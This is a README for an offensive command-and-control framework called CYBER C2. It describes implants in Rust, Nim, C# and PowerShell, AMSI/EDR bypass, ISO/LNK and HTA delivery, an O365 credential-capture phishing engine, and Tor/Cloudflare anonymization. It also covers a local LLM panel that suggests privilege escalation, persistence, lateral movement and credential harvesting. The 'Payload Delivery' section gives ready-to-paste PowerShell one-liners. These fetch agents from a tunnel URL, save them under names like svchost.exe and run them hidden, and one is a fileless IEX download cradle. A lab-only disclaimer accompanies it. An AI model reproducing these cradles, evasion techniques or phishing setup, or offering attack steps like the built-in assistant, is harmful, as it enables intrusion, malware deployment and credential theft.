# CYBER C2

A modular red team Command & Control framework built for penetration testing and offensive security training labs. Features multi-language agents (Rust, Nim, C#, PowerShell), native Metasploit integration, BITS-based covert C2 channel, interactive PTY shells, and a local AI assistant powered by Ollama.

> **Lab Use Only** - This framework is designed for authorized security testing, CTF competitions, and isolated lab environments (HackTheBox, TryHackMe, OSCP labs, etc.).

---

## Features

### C2 Channels
- **WebSocket C2** - Real-time bidirectional communication with auto-reconnection
- **BITS C2** - Covert channel using Windows Background Intelligent Transfer Service polling
- **MSF Relay** - Native Metasploit session relay with meterpreter/shell passthrough

### Multi-Language Agent Ecosystem

| Agent | Language | Size | Key Feature |
|-------|----------|------|-------------|
| `rust_agent_v3` | Rust | ~1.8MB | Full ConPTY interactive shell, DLL variant |
| `nim_agent` | Nim | ~120KB | Lightweight, WinHTTP-native, EXE + DLL |
| `cs_agent` | C# (.NET 8) | ~12MB | ConPTY + BITS support |
| `enhanced_agent` | PowerShell | N/A | Fileless, AMSI-aware, BITS protocol |

All agents support:
- HMAC-SHA256 signed authentication (no plaintext keys in traffic)
- Automatic C2 URL and token injection at build time via `start_c5.sh`
- Persistent shell sessions (stateful, not one-shot)

### Metasploit Integration
- Native MSFConsole PTY passthrough in the browser
- Session management (meterpreter & shell)
- Dynamic listener/handler configuration with SSL
- Payload generation via msfvenom (raw, exe, dll)
- Post-exploitation module execution

### Evasion & Delivery
- **Syscall-direct injection** - NT API calls bypassing userland hooks (ETW, AMSI)
- **AMSI/Defender bypass** - Built-in unhooking techniques
- **ISO + LNK delivery** - Mark-of-the-Web bypass without macros
- **HTA smuggling** - Self-contained payloads with fake progress UI
- **Shellcode loaders** - Staged and stageless injection variants

### Phishing Engine
- Email template library (invoice, meeting, document, password-reset)
- Built-in O365 credential capture pages
- Credential logging with IP and user-agent tracking
- SMTP support (Mailhog for testing, real SMTP for ops)

### AI Red Team Assistant
- **Powered by Ollama** - 100% local, no API keys, no cloud
- Auto-detects any model installed by the user (`llama3`, `mistral`, `qwen`, etc.)
- Terminal output analysis with security findings
- Quick actions: privilege escalation, persistence, lateral movement, credential harvesting, evasion
- Context-aware suggestions based on live terminal output

### Operator Console
- Multi-tab interface: MSFConsole PTY, Agent Shells, BITS C2, AI Panel
- Real-time agent status (online/offline with heartbeat detection)
- WebSocket multiplexing for concurrent operations
- RSA key-based authentication with JWT sessions
- Multi-operator support

### OPSEC Stack
- **Dual Cloudflare Tunnels** - Separate tunnel for C2 (`localhost:8000`) and MSF (`localhost:8443`), each gets its own `.trycloudflare.com` URL
- **Tor routing** - Tunnels can be routed through Tor SOCKS5 proxy for additional anonymity
- **Layered anonymization** - VPN + Tor + Cloudflare (auto-detected at startup)
- **Resume mode** (`--resume` / `-r`) - Keeps same tunnel URLs after crashes, so payloads already deployed keep working
- Token-protected payload delivery endpoints
- mTLS mutual authentication (optional)
- Replay attack prevention (5-minute HMAC timestamp window)

---

## Quick Start

### Prerequisites
- Linux (Ubuntu/Debian recommended)
- Python 3.10+
- Redis
- Ollama (for AI assistant)
- Rust toolchain + MinGW-w64 (for agent compilation)
- Metasploit Framework (optional)

### Install

```bash
# Clone
git clone https://github.com/neuralxploit/cyber_c2.git
cd cyber_c2

# Run setup (installs dependencies, Rust toolchain, etc.)
chmod +x setup_ubuntu.sh
./setup_ubuntu.sh

# Install Python deps
pip install -r requirements.txt

# Install an Ollama model for the AI assistant
ollama pull llama3.1
# Or any model you prefer: mistral, qwen2.5, codellama, etc.
```

### Launch

```bash
chmod +x start_c5.sh
./start_c5.sh
```

On **first run**, `start_c5.sh` automatically:
1. Creates `.env` from `.env.example`
2. Generates `JWT_SECRET`
3. Generates RSA admin keypair (`admin.key` + adds public key to `.env`)
4. Generates fresh `PAYLOAD_TOKEN`, `AGENT_API_KEY`, `A2A_JWT_SECRET`

No manual config needed - just run it and login.

**Full startup sequence:**
1. First-run setup (`.env`, keys, tokens)
2. Validates OPSEC layers (VPN, Tor detection)
3. Cross-compiles Rust agents for Windows (x86_64-pc-windows-gnu)
4. Starts **dual Cloudflare tunnels** (C2 on `:8000`, MSF on `:8443`), optionally routed through Tor
5. Injects tunnel URLs and tokens into all payload source files
6. Compiles Nim and C# agents with fresh config
7. Launches the C2 server (FastAPI + Redis)
8. Prints ready-to-use payload one-liners with live tunnel URLs

```bash
# Resume mode - reuse existing tunnel URLs (e.g. after a crash)
./start_c5.sh --resume

# Route through Tor for extra anonymity
./start_c5.sh --tor
```

---

## Payload Delivery

After launch, `start_c5.sh` prints ready-to-paste commands for the target:

```powershell
# Rust Agent (recommended - full PTY shell)
$d=$env:LOCALAPPDATA+'\Temp\svc.exe';IWR '<TUNNEL_URL>/payloads/rust_agent.exe?key=<TOKEN>' -OutFile $d;Start-Process $d -WindowStyle Hidden

# Nim Agent (lightweight, AV-evasive)
$d=$env:TEMP+'\svchost.exe';IWR '<TUNNEL_URL>/payloads/agent_nim.exe?key=<TOKEN>' -OutFile $d;Start-Process $d -WindowStyle Hidden

# PowerShell (fileless)
powershell -nop -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('<TUNNEL_URL>/payloads/enhanced_agent_fastapi.ps1?key=<TOKEN>'))"

# Syscall Injection (AMSI/ETW bypass)
IEX(IWR '<TUNNEL_URL>/payloads/i5_syscall.ps1?key=<TOKEN>' -UseBasicParsing)
```

---

## Project Structure

```
cyber_c2/
├── main.py                  # FastAPI C2 server (endpoints, WebSockets, agent mgmt)
├── start_c5.sh              # Launch script (build, configure, deploy)
├── app/
│   ├── security.py          # JWT, HMAC-SHA256, mTLS auth
│   ├── crypto_auth.py       # RSA challenge-response
│   └── database.py          # SQLite user store
├── static/
│   ├── index.html           # Operator console UI
│   ├── js/
│   │   ├── c2.js            # Core C2 frontend logic
│   │   ├── ai_chat.js       # AI assistant module
│   │   └── c2_msf_pty.js    # MSF PTY integration
│   ├── bits.html            # BITS C2 agent page
│   └── o365.html            # Phishing credential page
├── payloads/
│   ├── rust_agent_v3/       # Rust agent (ConPTY, DLL, persistence)
│   ├── nim_agent/           # Nim agent (lightweight, WinHTTP)
│   ├── cs_agent/            # C# .NET 8 agent
│   ├── dropper_rust/        # Rust shellcode dropper
│   ├── rust_injector/       # Rust process injector
│   ├── *.ps1                # PowerShell loaders & injectors
│   └── *.hta                # HTA delivery payloads
├── tools/                   # Recon & exploit tools
├── sophos_bypass/           # EDR bypass research & techniques
└── .env.example             # Configuration template
```

---

## Authentication Setup

The operator console uses **RSA key-based authentication** - no passwords. You paste your private key into the login page, the server verifies it against your public key.

**Automatic (recommended):** `start_c5.sh` generates everything on first run - just login with:
```bash
cat admin.key
# Copy the output and paste into the login page
```

**Manual (if needed):**
```bash
python generate_keys.py
# Creates admin.key and prints ADMIN_PUBLIC_KEY to add to .env
```

> **Never commit or share your `admin.key`** - it's excluded by `.gitignore`. Each operator should generate their own keypair.

---

## AI Assistant Setup

The AI assistant uses **Ollama** - runs entirely on your machine, no API keys or cloud services.

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull any model
ollama pull llama3.1        # General purpose
ollama pull mistral         # Fast & capable  
ollama pull qwen2.5         # Good for code
ollama pull codellama       # Code-focused

# The C2 auto-detects whatever model you have installed
# Or set a specific one in .env:
# OLLAMA_MODEL=llama3.1
```

The AI panel provides:
- **Analyze** - Scan terminal output for credentials, misconfigs, attack paths
- **Privesc** - Privilege escalation suggestions with exact commands
- **Persist** - Persistence mechanism recommendations
- **Lateral** - Lateral movement techniques
- **Creds** - Credential harvesting methods
- **Evasion** - AV/EDR bypass techniques

---

## Configuration

All config is in `.env` (auto-generated by `start_c5.sh` if not present):

| Variable | Description | Default |
|----------|-------------|---------|
| `PORT` | C2 server port | `8000` |
| `MSF_HOST` | Metasploit RPC host | `127.0.0.1` |
| `MSF_PORT` | Metasploit RPC port | `55553` |
| `OLLAMA_BASE_URL` | Ollama API endpoint | `http://localhost:11434/v1` |
| `OLLAMA_MODEL` | LLM model (empty = auto-detect) | *(auto)* |
| `PAYLOAD_TOKEN` | Payload delivery auth token | *(auto-generated)* |
| `AGENT_API_KEY` | Agent callback auth key | *(auto-generated)* |
| `A2A_JWT_SECRET` | JWT signing secret | *(auto-generated)* |

---

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Use only in environments you own or have explicit written permission to test. The authors are not responsible for misuse.

---

## License

MIT
